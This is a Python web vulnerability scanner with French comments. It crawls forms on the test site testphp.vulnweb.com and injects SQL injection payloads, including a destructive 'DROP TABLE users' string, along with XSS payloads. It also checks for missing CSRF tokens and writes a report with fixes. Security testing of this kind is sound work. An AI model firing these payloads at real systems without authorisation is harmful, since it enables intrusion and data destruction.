import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Configuration initiale
target_url = "http://testphp.vulnweb.com"
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

vulnerabilities_found = []

def get_form_details(form, base_url):
    details = {}
    action = form.attrs.get("action", "")
    details["action"] = urljoin(base_url, action)
    details["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all(["input", "textarea", "select"]):
        input_name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")
        input_value = input_tag.attrs.get("value", "")
        if input_name:
            inputs.append({"name": input_name, "type": input_type, "value": input_value})
    details["inputs"] = inputs
    return details

def generate_report(vulnerabilities):
    with open("report.txt", "w") as report:
        report.write("RAPPORT DE VULNERABILITES - TESTPHP\n")
        report.write("="*35 + "\n\n")
        for vuln in vulnerabilities:
            report.write(f"Type : {vuln['type']}\n")
            report.write(f"Endpoint : {vuln['endpoint']}\n")
            report.write(f"Payload : {vuln['payload']}\n")
            report.write(f"Recommandation : {get_recommendation(vuln['type'])}\n")
            report.write("-" * 20 + "\n")

def get_recommendation(vuln_type):
    recommendations = {
        "SQL Injection": "Utiliser des requêtes paramétrées (Prepared Statements).",
        "XSS": "Echapper les sorties HTML et mettre en place une CSP.",
        "CSRF": "Implémenter des jetons anti-CSRF et vérifier l'origine des requêtes."
    }
    return recommendations.get(vuln_type, "Suivre les bonnes pratiques de codage sécurisé.")

# --- STEP 2: Scraping ---
print(f"[-] Scan de la cible : {target_url}")
response = session.get(target_url)
soup = BeautifulSoup(response.content, "html.parser")
forms = soup.find_all("form")

# --- STEP 3: Detection ---
for form in forms:
    details = get_form_details(form, target_url)
    
    # 1. Test SQL Injection
    sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    sql_errors = ["sql syntax", "mysql_fetch", "pdoexception"]
    for payload in sqli_payloads:
        data = {inp["name"]: payload for inp in details["inputs"] if inp["type"] != "submit"}
        res = session.post(details["action"], data=data) if details["method"] == "post" else session.get(details["action"], params=data)
        if any(error in res.text.lower() for error in sql_errors):
            vulnerabilities_found.append({"type": "SQL Injection", "endpoint": details["action"], "payload": payload})

    # 2. Test XSS
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
    for payload in xss_payloads:
        data = {inp["name"]: payload for inp in details["inputs"] if inp["type"] != "submit"}
        res = session.post(details["action"], data=data) if details["method"] == "post" else session.get(details["action"], params=data)
        if payload in res.text:
            vulnerabilities_found.append({"type": "XSS", "endpoint": details["action"], "payload": payload})

    # 3. Test CSRF
    if details["method"] == "post":
        has_token = any(t in str(details["inputs"]).lower() for t in ["csrf", "token"])
        if not has_token:
            vulnerabilities_found.append({"type": "CSRF", "endpoint": details["action"], "payload": "N/A (Missing Token)"})

# --- STEP 4: Reporting ---
generate_report(vulnerabilities_found)
print(f"[+] Scan terminé. {len(vulnerabilities_found)} vulnérabilités trouvées. Rapport généré : report.txt")
